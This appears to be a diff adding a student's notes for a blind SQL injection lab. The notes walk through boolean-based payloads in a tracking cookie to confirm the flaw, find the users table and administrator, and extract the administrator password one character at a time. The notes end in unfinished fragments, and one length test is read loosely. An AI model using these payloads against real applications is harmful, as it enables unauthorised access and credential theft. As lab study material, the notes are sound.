@@ -1,0 +1,45 @@
+Lab 11 - Blind SQL injection with conditional responses
+
+Vulnerable parameter - tracking cookie
+
+End Goals:
+1) Enumerate the password of the administrator
+2) Log in as the administrator user
+
+Analysis:
+1) Confirm that the parameter is vulnerable to blind SQLi
+
+SELECT tracking-id FROM tracking-table WHERE tracking-id = 'Qp5SwxesTIwLWfdU'
+
+-> If this tracking id exists -> query returns value -> "Welcome Back" message
+-> If the tracking id doesn't exist -> query returns nothing -> no "Welcome Back" message
+
+SELECT tracking-id FROM tracking-table WHERE tracking-id = 'Qp5SwxesTIwLWfdU' and 1=1--'
+-> TRUE -> "Welcome Back"
+
+SELECT tracking-id FROM tracking-table WHERE tracking-id = 'Qp5SwxesTIwLWfdU' and 1=0--'
+-> FALSE -> no "Welcome Back"
+
+2) Confirm that we have a users table 
+
+SELECT tracking-id FROM tracking-table WHERE tracking-id = 'Qp5SwxesTIwLWfdU' and (SELECT 'x' FROM users LIMIT 1)='x'--'
+-> users table exists in the database
+
+3) Confirm that username 'administrator' exists in users table
+
+SELECT tracking-id FROM tracking-table WHERE tracking-id = 'Qp5SwxesTIwLWfdU' and (SELECT username FROM users WHERE username='administrator')='administrator'--'
+
+-> administrator users exists
+
+4) Enumerate the password of the administrator user
+
+SELECT tracking-id FROM tracking-table WHERE tracking-id = 'Qp5SwxesTIwLWfdU' and (SELECT username FROM users WHERE username='administrator' and LENGTH(password)>20)='administrator'--'
+
+-> password is exactly 20 characters
+
+SELECT tracking-id FROM tracking-table WHERE tracking-id = 'Qp5SwxesTIwLWfdU' and (SELECT substring(password,1,1) FROM users WHERE username='administrator')='a'--'
+
+k
+
+script.py url
+
